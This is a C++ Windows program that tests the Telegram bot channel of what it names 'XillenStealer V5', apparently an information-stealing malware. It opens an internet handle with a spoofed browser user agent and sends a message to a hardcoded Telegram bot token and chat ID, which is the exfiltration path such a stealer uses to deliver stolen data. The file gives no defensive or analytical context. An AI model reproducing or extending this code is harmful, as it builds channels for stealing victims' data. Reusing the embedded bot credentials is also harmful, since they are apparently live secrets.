#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <sstream>

#pragma comment(lib, "wininet.lib")

int main() {
    std::cout << "[*] Тестирование отправки в Telegram...\n";
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cout << "[!] Failed to open internet handle\n";
        return 1;
    }
    
    std::string token = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I";
    std::string chatId = "7368280792";
    std::string message = "Test from XillenStealer V5!";
    
    std::ostringstream url;
    url << "https://api.telegram.org/bot" << token 
        << "/sendMessage?chat_id=" << chatId 
        << "&text=" << message;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.str().c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        std::cout << "[!] Failed to open URL\n";
        InternetCloseHandle(hInternet);
        return 1;
    }
    
    char buffer[1024];
    DWORD bytesRead;
    
    if (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
        buffer[bytesRead] = '\0';
        std::cout << "[+] Response: " << buffer << "\n";
        std::cout << "[+] SUCCESS! Message sent to Telegram!\n";
    } else {
        std::cout << "[!] Failed to read response\n";
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return 0;
}
